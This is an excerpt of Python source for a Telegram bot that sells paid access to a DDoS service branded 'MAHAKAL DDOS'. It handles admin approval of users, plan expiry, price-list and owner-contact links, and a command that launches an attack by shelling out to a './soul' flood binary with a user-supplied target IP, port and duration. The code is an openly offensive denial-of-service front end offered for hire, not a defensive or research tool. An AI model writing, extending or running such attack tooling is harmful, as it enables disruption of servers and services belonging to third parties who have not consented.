...
def create_inline_keyboard():
    ...
    button3 = types.InlineKeyboardButton(
        text="❤‍🩹 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 ❤‍🩹", url="https://t.me/Mahakal_16490")
    button1 = types.InlineKeyboardButton(text="👤 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👤",
        url="https://t.me/Mahakal1814")
    markup.add(button3)
    markup.add(button1)
    return markup
            ...
            try:
                ...
                if now > valid_until_datetime:
                    try:
                        bot.send_message(
                            user_id,
                            f"*⚠️ Access Expired! Owner @Mahakal1814*\n"
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./soul {target_ip} {target_port} {duration} 130")
    await process.communicate()
    
    bot.attack_in_progress = False
    
    # Notify the user about the attack completion
    bot.send_message(chat_id, "*✅ Attack Completed! ✅ Owner @Mahakal1814*\n"
...
def approve_or_disapprove_user(message):
    ...
    if not is_admin:
        bot.send_message(
            chat_id,
            "🚫 *Access Denied! Owner @Mahakal1814*\n"
            "❌ *You don't have the required permissions to use this command. Owner @Mahakal1814*\n"
    ...
    if action == '/approve':
        ...
        bot.send_message(
            chat_id,
            f"✅ *Approval Successful! Owner @Mahakal1814*\n"
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       ...
                                       "*Contact the owner for assistance: @Mahakal1814.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
...
def process_attack_command(message):
    try:
        ...
        bot.send_message(message.chat.id, f"*🚀 Attack Launched MAHAKAL DDOS 🚀*\n\n"
    ...
    try:
        ...
        if not user_data:
            ...
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/Mahakal_16490")
            markup.add(button1)
            markup.add(button2)
        else:
...
def rules_command(message):
    rules_text = (
        ...
        "6. Report issues! 🛡️ \nMessage TO Owner @Mahakal1814 for any problems.\n\n"
...
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO MAHAKAL DDOS WORLD!* 🎉\n\n"
...
def canary_command(message):
    ...
    button1 = types.InlineKeyboardButton(
        ...
        url="https://t.me/c/1474132529/3404")
    button2 = types.InlineKeyboardButton(
